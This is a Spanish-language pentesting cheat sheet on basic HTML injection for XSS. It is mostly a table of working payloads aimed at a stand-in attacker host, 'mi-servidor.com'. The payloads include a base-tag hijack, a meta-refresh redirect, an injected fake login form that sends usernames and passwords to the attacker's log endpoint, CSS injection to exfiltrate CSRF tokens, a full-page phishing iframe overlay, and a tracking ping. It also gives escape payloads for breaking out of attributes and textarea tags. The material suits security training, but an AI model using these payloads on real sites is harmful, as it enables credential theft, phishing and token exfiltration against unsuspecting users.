---
aliases:
tags:
  - type/cheatsheet
  - vuln/xss
  - technique/execution
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
type: CheatSheet
linked:
  - "[[Cross-Site Scripting (XSS)]]"
---
# XSS - HTML Básico

***

## Cheatsheet

|                **Etiqueta / Vector**                 |                                                                  **Payload de Ejemplo**                                                                  |                                                                                       **Impacto y Contexto de Uso**                                                                                        |
| :--------------------------------------------------: | :------------------------------------------------------------------------------------------------------------------------------------------------------: | :--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------: |
| <br><pre><code>`<h1>` / `<b>` / `<div>`</code></pre> |                                                       <br><pre><code>`<h1>Inyección Exitosa</h1>`                                                        |                          <br>**Defacement y PoC.** Confirma visualmente la ausencia de [[Sanitización]] de caracteres como `<` y `>`. Base para escalar a vectores más complejos.                          |
|         <br><pre><code>`<base>`</code></pre>         |                                                 <br><pre><code>`<base href="https://mi-servidor.com/">`                                                  |              <br>**Base Hijacking.** Redirige todas las cargas de recursos con rutas relativas (scripts, imágenes, hojas de estilo) hacia un dominio bajo mi control. Altamente crítico.<br>               |
|         <br><pre><code>`<meta>`</code></pre>         |                                   <br><pre><code>`<meta http-equiv="refresh" content="0;url=https://mi-servidor.com">`                                   |           <br>**Redirección Abierta.** Fuerza al navegador a navegar instantáneamente hacia un sitio malicioso. En navegadores antiguos, permitía inyectar pseudo-protocolos `javascript:`.<br>            |
|         <br><pre><code>`<form>`</code></pre>         | <pre><code>`<form action="https://mi-servidor.com/log"><input type="text" name="user"><input type="password" name="pass"><button>Login</button></form>`  |                     <br>**Phishing / UI Redressing.** Inyecta un formulario falso en la página legítima para capturar credenciales del usuario y enviarlas a mi servidor de registro.                      |
|         <br><pre><code>`<link>`</code></pre>         |                                     <br><pre><code>`<link rel="stylesheet" href="https://mi-servidor.com/robo.css">`                                     |            <br>**CSS Injection.** Permite cargar hojas de estilo externas. Se utiliza para exfiltrar tokens CSRF o datos del DOM mediante selectores de atributos, sin requerir JavaScript.<br>            |
|        <br><pre><code>`<iframe>`</code></pre>        | <pre><code>`<iframe src="https://mi-servidor.com/falso-login" style="width:100%; height:100%; border:none; position:absolute; top:0; left:0;"></iframe>` |            <br>**Clickjacking / Overlay.** Superpone completamente la interfaz visual de la aplicación vulnerable con una página controlada, engañando al usuario para que interactúe con ella.            |
|  <br><pre><code>`<object>` / `<embed>`</code></pre>  |                                      <br><pre><code>`<object data="https://mi-servidor.com/malware.swf"></object>`                                       |           <br>**Carga de Plugins/Recursos Externos.** Utilizado históricamente para inyectar Flash malicioso o applets, forzando la ejecución de código en el contexto de plugins del navegador.           |
|         <br><pre><code>`<body>`</code></pre>         |                                         <br><pre><code>`<body background="https://mi-servidor.com/tracker.png">`                                         | <br>**Tracking / Exfiltración Ciega.** Sobrescribe atributos estructurales del documento para forzar una petición HTTP GET silenciosa hacia mi servidor, útil como un ping de confirmación básica.<br><br> |
^xss-html

### Contextos de Escapes Básicos

Para que la inyección de HTML básico resulte en un XSS exitoso, es crítico escapar del contexto actual si la entrada del usuario se refleja dentro de un atributo o de una etiqueta ya existente.
- **Cierre de Atributos:** Si el valor ingresado aterriza dentro de un atributo (ej. `<input type="text" value="INYECCIÓN_AQUÍ">`), se debe cerrar la comilla y la etiqueta antes de inyectar el nuevo HTML: `"><script>alert(1)</script>`
- **Cierre de Etiquetas de Texto:** Si la entrada se refleja dentro de etiquetas que bloquean la ejecución (ej. `<textarea>INYECCIÓN_AQUÍ</textarea>` o `<title>`), es necesario romper esa etiqueta primero: `</textarea><script>alert(1)</script>`


___

## Overview

La inyección de HTML básico altera la estructura del documento mediante la inserción de etiquetas estándar permitidas. En la cadena de explotación de un [[XSS]], utilizo estas etiquetas estructurales no necesariamente para ejecutar código de forma inmediata, sino para modificar el entorno del [[DOM]], secuestrar la carga de recursos relativos, exfiltrar información mediante CSS o montar escenarios de ingeniería social directamente sobre la interfaz de la aplicación vulnerable.


___

